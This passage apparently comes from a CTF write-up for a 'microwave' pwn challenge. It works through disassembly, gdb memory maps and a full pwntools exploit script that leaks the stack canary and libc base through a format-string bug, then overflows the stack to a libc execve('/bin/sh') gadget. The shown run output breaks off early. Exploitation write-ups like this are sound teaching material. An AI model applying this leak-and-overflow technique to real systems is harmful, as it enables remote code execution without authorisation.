&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x00000ac0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;iz&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;grep&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;#&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;vaddr&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x00002adb&lt;/span&gt; &lt;span class="n"&gt;paddr&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x00002adb&lt;/span&gt; &lt;span class="n"&gt;ordinal&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mo"&gt;01&lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt; &lt;span class="n"&gt;sz&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt; &lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;15&lt;/span&gt; &lt;span class="n"&gt;section&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;rodata&lt;/span&gt; &lt;span class="n"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;ascii&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;           &lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x00000ac0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;axt&lt;/span&gt; &lt;span class="mh"&gt;0x00002adb&lt;/span&gt;
&lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="mh"&gt;0x1007&lt;/span&gt; &lt;span class="n"&gt;lea&lt;/span&gt; &lt;span class="n"&gt;rsi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;rip&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x1acd&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="n"&gt;sub&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__printf_chk_0&lt;/span&gt;
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x00000ac0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;pd&lt;/span&gt; &lt;span class="mh"&gt;@0x1007&lt;/span&gt;
&lt;span class="p"&gt;...&lt;/span&gt;
&lt;span class="mh"&gt;0x00001032&lt;/span&gt;      &lt;span class="mf"&gt;31ff&lt;/span&gt;           &lt;span class="n"&gt;xor&lt;/span&gt; &lt;span class="n"&gt;edi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;edi&lt;/span&gt; &lt;span class="c1"&gt;// 0 == STDIN&lt;/span&gt;
&lt;span class="mh"&gt;0x00001034&lt;/span&gt;      &lt;span class="mf"&gt;4889e6&lt;/span&gt;         &lt;span class="n"&gt;mov&lt;/span&gt; &lt;span class="n"&gt;rsi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;rsp&lt;/span&gt; &lt;span class="c1"&gt;// buffer on the stack&lt;/span&gt;
&lt;span class="mh"&gt;0x00001037&lt;/span&gt;      &lt;span class="n"&gt;ba00080000&lt;/span&gt;     &lt;span class="n"&gt;mov&lt;/span&gt; &lt;span class="n"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;section&lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="n"&gt;rela&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;plt&lt;/span&gt;  &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;@? &amp;quot;&lt;/span&gt; &lt;span class="p"&gt;@&lt;/span&gt; &lt;span class="mh"&gt;0x800&lt;/span&gt;
&lt;span class="mh"&gt;0x0000103c&lt;/span&gt;      &lt;span class="mi"&gt;31&lt;/span&gt;&lt;span class="n"&gt;c0&lt;/span&gt;           &lt;span class="n"&gt;xor&lt;/span&gt; &lt;span class="n"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;eax&lt;/span&gt;
&lt;span class="mh"&gt;0x0000103e&lt;/span&gt;      &lt;span class="n"&gt;e8ddf9ffff&lt;/span&gt;     &lt;span class="n"&gt;call&lt;/span&gt; &lt;span class="n"&gt;sym&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;imp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;
&lt;span class="p"&gt;...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We read 0x800 (1024) from stdin to the buffer (on the stack).
If we consider the whole block, only 0x418 (1048) are reserved
on the stack. We can thus overwrite saved RIP&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;sub rsp, 0x418                  | reserve 1048
lea rsi, [rip + 0x1acd]         |
mov edi, 1                      |
mov rax, qword fs:[0x28]        | get the canary
mov qword [rsp + 0x408], rax    | store canary at 1032
xor eax, eax                    |
call sym.imp.__printf_chk ;[a]  |
xor edi, edi                    |
call sym.imp.fflush ;[b]        |
xor edi, edi                    | 0 == stdin
mov rsi, rsp                    | buffer on the stack
mov edx, section..rela.plt      | 1024 bytes (0x800)
xor eax, eax                    |
call sym.imp.read ;[c]          |
lea rdi, [rip + 0x1aa1]         |
call sym.imp.puts ;[d]          |
mov rax, qword [rsp + 0x408]    |
xor rax, qword fs:[0x28]        |
jne 0x106a ;[e]
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So to overflow saved RIP, the payload should look like this:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1032 bytes of junk&lt;/li&gt;
&lt;li&gt;8 bytes to replace the canary&lt;/li&gt;
&lt;li&gt;&lt;code&gt;1048-1032-8 = 8&lt;/code&gt; bytes&lt;/li&gt;
&lt;li&gt;saved RIP&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;The exploit&lt;/h2&gt;
&lt;p&gt;Due to the protections, one needs to exploit the binary using ROP.
However looking into the provided libc shows that the &lt;em&gt;magic&lt;/em&gt; ROP chain
is present.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;000000000004652&lt;/span&gt;&lt;span class="nf"&gt;C&lt;/span&gt; &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;rax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;cs&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="no"&gt;environ_ptr_0&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;0000000000046533&lt;/span&gt; &lt;span class="nf"&gt;lea&lt;/span&gt;     &lt;span class="no"&gt;rdi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;aBinSh&lt;/span&gt;     &lt;span class="err"&gt;;&lt;/span&gt; &lt;span class="err"&gt;&amp;quot;/&lt;/span&gt;&lt;span class="no"&gt;bin&lt;/span&gt;&lt;span class="err"&gt;/&lt;/span&gt;&lt;span class="no"&gt;sh&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;000000000004653&lt;/span&gt;&lt;span class="nf"&gt;A&lt;/span&gt; &lt;span class="no"&gt;lea&lt;/span&gt;     &lt;span class="no"&gt;rsi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;180&lt;/span&gt;&lt;span class="no"&gt;h&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="no"&gt;var_150&lt;/span&gt;&lt;span class="err"&gt;]&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;000000000004653&lt;/span&gt;&lt;span class="nf"&gt;F&lt;/span&gt; &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;cs&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="no"&gt;dword_3C06C0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;0000000000046549&lt;/span&gt; &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;cs&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="no"&gt;dword_3C06D0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;0000000000046553&lt;/span&gt; &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;rdx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="no"&gt;rax&lt;/span&gt;&lt;span class="err"&gt;]&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;0000000000046556&lt;/span&gt; &lt;span class="nf"&gt;call&lt;/span&gt;    &lt;span class="no"&gt;execve&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So by overwriting saved-RIP with that address (libc base address + 0x4652C)
we get RCE (execve of "/bin/sh").&lt;/p&gt;
&lt;p&gt;One needs to leak two elements to be able to exploit:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;the canary (to bypass canary protection)&lt;/li&gt;
&lt;li&gt;one address of the libc to retrieve the offset to the magic gadget above&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;These are retrieved using the first vulnerability (string format) and then
the second vulnerability (buffer overflow) is used to overflow the stack
and overwrite the return address.&lt;/p&gt;
&lt;p&gt;The addresses leaked from the string format shows some
of them are in the libc (starting with 0x7fff...). We need to know how far from
the base address these are in order to
retrieve the base address. This base address is then used to refer to the
magic gadget.&lt;/p&gt;
&lt;p&gt;This is easily done with gdb:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;gdb microwave_61f50dba931bb10ab3089215b2e188f4
gdb-peda&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;set &lt;/span&gt;environment &lt;span class="nv"&gt;LD_PRELOAD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;./libc.so.6
gdb-peda&lt;span class="nv"&gt;$ &lt;/span&gt;r
Starting program: /tmp/microwave_61f50dba931bb10ab3089215b2e188f4

 --------------------------------------------------------
 &lt;span class="p"&gt;|&lt;/span&gt;     Welcome to the next generation of MicroWaves!    &lt;span class="p"&gt;|&lt;/span&gt;
 &lt;span class="p"&gt;|&lt;/span&gt;                         ***                          &lt;span class="p"&gt;|&lt;/span&gt;
 &lt;span class="p"&gt;|&lt;/span&gt; This stylish Microwave with Grill &lt;span class="k"&gt;function&lt;/span&gt;, includes &lt;span class="p"&gt;|&lt;/span&gt;
 &lt;span class="p"&gt;|&lt;/span&gt;      a &lt;span class="k"&gt;function&lt;/span&gt; that tweets your favourite food!     &lt;span class="p"&gt;|&lt;/span&gt;
 &lt;span class="p"&gt;|&lt;/span&gt;                         ***                          &lt;span class="p"&gt;|&lt;/span&gt;
 --------------------------------------------------------
           ----------------------------------
           &lt;span class="p"&gt;|&lt;/span&gt;  1. Connect to Twitter account &lt;span class="p"&gt;|&lt;/span&gt;
           &lt;span class="p"&gt;|&lt;/span&gt;  2. Edit your tweet            &lt;span class="p"&gt;|&lt;/span&gt;
           &lt;span class="p"&gt;|&lt;/span&gt;  3. Grill &lt;span class="p"&gt;&amp;amp;&lt;/span&gt; Tweet your food    &lt;span class="p"&gt;|&lt;/span&gt;
           &lt;span class="p"&gt;|&lt;/span&gt;  q. Exit                       &lt;span class="p"&gt;|&lt;/span&gt;
           ----------------------------------

           &lt;span class="o"&gt;[&lt;/span&gt;MicroWave&lt;span class="o"&gt;]&lt;/span&gt;: 1

           Log in on Twitter:
           username: %p.%p.%p.%p.%p
           password: n07_7h3_fl46

Checking 0xa.0x7ffff7b02870.0x7ffff7ff3740.0x555555556ac0.&lt;span class="o"&gt;(&lt;/span&gt;nil&lt;span class="o"&gt;)&lt;/span&gt;
Twitter account
............
           ----------------------------------
           &lt;span class="p"&gt;|&lt;/span&gt;  1. Connect to Twitter account &lt;span class="p"&gt;|&lt;/span&gt;
           &lt;span class="p"&gt;|&lt;/span&gt;  2. Edit your tweet            &lt;span class="p"&gt;|&lt;/span&gt;
           &lt;span class="p"&gt;|&lt;/span&gt;  3. Grill &lt;span class="p"&gt;&amp;amp;&lt;/span&gt; Tweet your food    &lt;span class="p"&gt;|&lt;/span&gt;
           &lt;span class="p"&gt;|&lt;/span&gt;  q. Exit                       &lt;span class="p"&gt;|&lt;/span&gt;
           ----------------------------------

           &lt;span class="o"&gt;[&lt;/span&gt;MicroWave&lt;span class="o"&gt;]&lt;/span&gt;: ^C
Program received signal SIGINT, Interrupt.
Stopped reason: SIGINT
0x00007ffff7b02810 in &lt;span class="nb"&gt;read&lt;/span&gt; &lt;span class="o"&gt;()&lt;/span&gt; from ./libc.so.6
gdb-peda&lt;span class="nv"&gt;$ &lt;/span&gt;vmmap
Start              End                Perm  Name
0x0000555555554000 0x0000555555557000 r-xp  /tmp/microwave_61f50dba931bb10ab3089215b2e188f4
0x0000555555757000 0x0000555555758000 r--p  /tmp/microwave_61f50dba931bb10ab3089215b2e188f4
0x0000555555758000 0x0000555555759000 rw-p  /tmp/microwave_61f50dba931bb10ab3089215b2e188f4
0x0000555555759000 0x000055555577a000 rw-p  &lt;span class="o"&gt;[&lt;/span&gt;heap&lt;span class="o"&gt;]&lt;/span&gt;
0x00007ffff7a17000 0x00007ffff7bd2000 r-xp  /tmp/libc.so.6
0x00007ffff7bd2000 0x00007ffff7dd1000 ---p  /tmp/libc.so.6
0x00007ffff7dd1000 0x00007ffff7dd5000 r--p  /tmp/libc.so.6
0x00007ffff7dd5000 0x00007ffff7dd7000 rw-p  /tmp/libc.so.6
0x00007ffff7dd7000 0x00007ffff7ddc000 rw-p  mapped
0x00007ffff7ddc000 0x00007ffff7dfc000 r-xp  /lib/x86_64-linux-gnu/ld-2.19.so
0x00007ffff7ff2000 0x00007ffff7ff8000 rw-p  mapped
0x00007ffff7ff8000 0x00007ffff7ffa000 r-xp  &lt;span class="o"&gt;[&lt;/span&gt;vdso&lt;span class="o"&gt;]&lt;/span&gt;
0x00007ffff7ffa000 0x00007ffff7ffc000 r--p  &lt;span class="o"&gt;[&lt;/span&gt;vvar&lt;span class="o"&gt;]&lt;/span&gt;
0x00007ffff7ffc000 0x00007ffff7ffd000 r--p  /lib/x86_64-linux-gnu/ld-2.19.so
0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p  /lib/x86_64-linux-gnu/ld-2.19.so
0x00007ffff7ffe000 0x00007ffff7fff000 rw-p  mapped
0x00007ffffffde000 0x00007ffffffff000 rw-p  &lt;span class="o"&gt;[&lt;/span&gt;stack&lt;span class="o"&gt;]&lt;/span&gt;
0xffffffffff600000 0xffffffffff601000 r-xp  &lt;span class="o"&gt;[&lt;/span&gt;vsyscall&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The offset is thus &lt;code&gt;hex(0x7ffff7b02870 - 0x00007ffff7a17000) = 0xeb870&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Now constructing the exploit using &lt;a href="https://github.com/Gallopsled/pwntools"&gt;pwntools&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Exploit:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;#!/usr/bin/env python2&lt;/span&gt;
&lt;span class="c"&gt;# author: deadc0de6&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pwn&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
&lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;arch&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;amd64&amp;#39;&lt;/span&gt;

&lt;span class="n"&gt;PASSWORD&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;n07_7h3_fl46&amp;quot;&lt;/span&gt;
&lt;span class="n"&gt;magic_addr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x4652c&lt;/span&gt;
&lt;span class="n"&gt;base_offset&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0xeb870&lt;/span&gt;

&lt;span class="c"&gt;#p = remote(&amp;#39;microwave.insomni.hack&amp;#39;, 1337)&lt;/span&gt;
&lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;remote&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;127.0.0.1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1337&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvuntil&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;[MicroWave]: &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c"&gt;# select (1) connect&lt;/span&gt;
&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvuntil&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;username: &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c"&gt;# send username&lt;/span&gt;
&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;%p.&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvuntil&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;password: &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c"&gt;# send password&lt;/span&gt;
&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PASSWORD&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c"&gt;# read leaked addresses&lt;/span&gt;
&lt;span class="n"&gt;ret&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvuntil&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;[MicroWave]: &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;addrs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ret&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;()[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;addrs&lt;/span&gt;

&lt;span class="c"&gt;# canary is the sixth element&lt;/span&gt;
&lt;span class="n"&gt;canary&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;addrs&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c"&gt;# libc address is the second element&lt;/span&gt;
&lt;span class="n"&gt;libcaddr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;addrs&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;libc_base&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;libcaddr&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;base_offset&lt;/span&gt;

&lt;span class="c"&gt;# print some information&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;canary is &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;hex&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;canary&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;libc base: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;hex&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;libc_base&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;magic addr: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;hex&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;libc_base&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;magic_addr&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

&lt;span class="c"&gt;# select (2) send tweet&lt;/span&gt;
&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;2&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvuntil&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;#&amp;gt; &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c"&gt;# construct the exploit&lt;/span&gt;
&lt;span class="n"&gt;buf&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;A&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;1032&lt;/span&gt;
&lt;span class="n"&gt;buf&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;canary&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;buf&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;B&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;
&lt;span class="n"&gt;buf&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;libc_base&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;magic_addr&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c"&gt;# exploit&lt;/span&gt;
&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;clean&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="c"&gt;# interact with it&lt;/span&gt;
&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;interactive&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;It is then possible to &lt;code&gt;cat&lt;/code&gt; the flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;./microwave-pwn.py
&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Opening connection to 127.0.0.1 on port 1337: Done

 --------------------------------------------------------
 &lt;span class="p"&gt;|&lt;/span&gt;     Welcome to the next generation of MicroWaves!    &lt;span class="p"&gt;|&lt;/span&gt;
 &lt;span class="p"&gt;|&lt;/span&gt;                         ***                          &lt;span class="p"&gt;|&lt;/span&gt;
 &lt;span class="p"&gt;|&lt;/span&gt; This stylish Microwave with Grill &lt;span class="k"&gt;function&lt;/span&gt;, includes &lt;span class="p"&gt;|&lt;/span&gt;
 &lt;span class="p"&gt;|&lt;/span&gt;      a &lt;span class="k"&gt;function&lt;/span&gt; that tweets your favourite food!     &lt;span class="p"&gt;|&lt;/span&gt;
 &lt;span class="p"&gt;|&lt;/span&gt;                         ***                          &lt;span class="p"&gt;|&lt;/span&gt;
 --------------------------------------------------------
           ----------------------------------
